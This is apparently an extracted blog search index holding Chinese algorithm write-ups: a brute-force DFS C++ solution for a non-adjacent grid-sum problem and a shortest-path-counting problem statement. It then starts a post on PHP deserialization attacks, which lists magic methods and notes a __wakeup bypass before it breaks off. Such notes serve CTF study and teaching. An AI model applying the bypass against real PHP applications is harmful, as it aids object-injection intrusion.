的由非负整数构成的数字矩阵，你需要在其中取出若干个数字，使得取出的任意两个数字不相邻（若一个数字在另外一个数字相邻 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>8</mn></mrow><annotation encoding="application/x-tex">8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span></span></span></span> 个格子中的一个即认为这两个数字相邻），求取出数字和最大是多少。</p><h2 id="输入格式-2"><a class="markdownIt-Anchor" href="#输入格式-2">#</a> 输入格式</h2><p>第一行有一个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>，表示了有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 组数据。</p><p>对于每一组数据，第一行有两个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，表示了数字矩阵为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 列。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行，每行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 个非负整数，描述了这个数字矩阵。</p><h1 id="题解-2"><a class="markdownIt-Anchor" href="#题解-2">#</a> 题解</h1><p>这里不给出样例输入输出了<br>因为数据量小，直接暴力深搜。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> T;</span><br><span class="line"><span class="type">int</span> N,M;</span><br><span class="line"><span class="type">int</span> map[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line"><span class="type">int</span> maxsum = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> enable[<span class="number">8</span>][<span class="number">8</span>];</span><br><span class="line"><span class="type">int</span> dx[<span class="number">8</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy[<span class="number">8</span>]=&#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> currentsum = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xx x+dx[i]</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> yy y+dy[i]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y == M+<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">search</span>(x+<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x == N+<span class="number">1</span>)&#123;</span><br><span class="line">maxsum = <span class="built_in">max</span>(maxsum,currentsum);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">search</span>(x,y+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(enable[x][y]==<span class="number">0</span>)&#123;</span><br><span class="line">currentsum += map[x][y];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">enable[xx][yy]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">search</span>(x,y+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">enable[xx][yy]--;</span><br><span class="line">&#125;</span><br><span class="line">currentsum-=map[x][y]; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin&gt;&gt;T;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=T;i++)&#123;</span><br><span class="line"><span class="comment">//memset(enable,0,sizeof(enable));</span></span><br><span class="line"><span class="comment">//memset(map,0,sizeof(map));//在做每个数据前都要初始化数组 </span></span><br><span class="line">cin&gt;&gt;N&gt;&gt;M;</span><br><span class="line">maxsum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=N;j++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;=M;k++)&#123;</span><br><span class="line">cin&gt;&gt;map[j][k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">currentsum=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">search</span>(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">cout&lt;&lt;maxsum&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p>这里我第一次写代码时，并没有考虑到所有的情况，向上面这样写才能考虑到所有的情况，因为你需要考虑到每个元组选或不选，要在 search 中体现出来。而我第一次写代码时默认都选择，进行了 n*m 的循环寻找，自然会少一些情况。这算是本题的一点收获。</p><h2 id="题目描述-3"><a class="markdownIt-Anchor" href="#题目描述-3">#</a> 题目描述</h2><p>给出一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 个顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 条边的无向无权图，顶点编号为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>∼</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">1\sim N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>。问从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 开始，到其他每个点的最短路有几条。</p><h2 id="输入格式-3"><a class="markdownIt-Anchor" href="#输入格式-3">#</a> 输入格式</h2><p>第一行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo separator="true">,</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">N,M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，为图的顶点数与边数。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 行，每行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x,y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>，表示有一条由顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span> 连向顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> 的边，请注意可能有自环与重边。</p><h2 id="输出格式-2"><a class="markdownIt-Anchor" href="#输出格式-2">#</a> 输出格式</h2><p>共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行，每行一个非负整数，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 行输出从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 有多少条不同的最短路，由于答案有可能会很大，你只需要输出 $ ans \bmod 100003$ 后的结果即可。如果无法到达顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 则输出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>。</p><h2 id="样例-1-2"><a class="markdownIt-Anchor" href="#样例-1-2">#</a> 样例 #1</h2><h3 id="样例输入-1-2"><a class="markdownIt-Anchor" href="#样例输入-1-2">#</a> 样例输入 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 7</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">2 4</span><br><span class="line">3 4</span><br><span class="line">2 3</span><br><span class="line">4 5</span><br><span class="line">4 5</span><br></pre></td></tr></table></figure><h3 id="样例输出-1-2"><a class="markdownIt-Anchor" href="#样例输出-1-2">#</a> 样例输出 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h2 id="提示-2"><a class="markdownIt-Anchor" href="#提示-2">#</a> 提示</h2><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span> 的最短路有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span> 条，分别为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 条 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mn>2</mn><mo>→</mo><mn>4</mn><mo>→</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">1\to 2\to 4\to 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 条 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mn>3</mn><mo>→</mo><mn>4</mn><mo>→</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">1\to 3\to 4\to 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span>（由于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>→</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">4\to 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span> 的边有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 条）。</p><p>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">20\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">1\le N \le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span></span></span></span>；<br>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>60</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">60\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">6</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">1\le N \le 10^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span>；<br>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>100</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">100\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup></mrow><annotation encoding="application/x-tex">1\le N\le10^6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>M</mi><mo>≤</mo><mn>2</mn><mo>×</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup></mrow><annotation encoding="application/x-tex">1\le M\le 2\times 10^6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span>。</p><h1 id="题解-3"><a class="markdownIt-Anchor" href="#题解-3">#</a> 题解</h1>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深搜 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2023/11/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/11/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="php序列化问题-主要是找链-分析代码"><a class="markdownIt-Anchor" href="#php序列化问题-主要是找链-分析代码">#</a> PHP 序列化问题 -&gt; 主要是找链 分析代码</h2><h3 id="反序列化魔术方法"><a class="markdownIt-Anchor" href="#反序列化魔术方法">#</a> 反序列化魔术方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//当一个对象销毁时被调用</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//当一个对象被当作一个字符串使用</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()<span class="comment">//在对象在被序列化之前运行</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()<span class="comment">//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>()<span class="comment">//获得一个类的成员变量时调用</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>()<span class="comment">//设置一个类的成员变量时调用</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()<span class="comment">//调用函数的方式调用一个对象时的回应方法</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>()<span class="comment">//当调用一个对象中的不能用的方法的时候就会执行这个函数</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span 